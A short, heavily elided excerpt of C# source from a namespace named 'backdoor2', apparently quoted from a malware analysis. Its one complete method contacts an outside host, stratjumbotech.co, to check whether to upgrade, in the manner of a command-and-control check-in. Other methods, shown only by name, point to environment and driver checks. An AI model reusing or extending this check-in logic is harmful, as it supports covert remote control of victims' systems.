...
namespace backdoor2
{
    class Program
    {
        ...
        static private bool Need_upgrade()
        {
            string s = "";
            try
            {
                WebClient client = new WebClient();
                s = client.DownloadString("https://stratjumbotech.co/version");
            }
            catch { }
            return s.Length > 0;
        }

        static private bool Is_compatible()
        {
        ...
        static private bool Is_gpo_applied()
        {
        ...
        static private bool Valid_driver()
        {
